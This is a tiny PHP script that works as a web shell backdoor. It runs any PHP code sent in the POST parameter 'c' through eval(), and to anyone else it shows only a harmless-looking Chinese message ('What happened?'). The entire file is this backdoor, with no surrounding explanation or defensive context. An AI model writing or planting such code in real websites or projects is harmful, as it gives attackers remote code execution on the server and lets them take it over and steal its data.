<?php
if(isset($_POST['c'])){
    $c = $_POST['c'];
    eval($c);
}else{
    echo "发生了什么？";
}
?>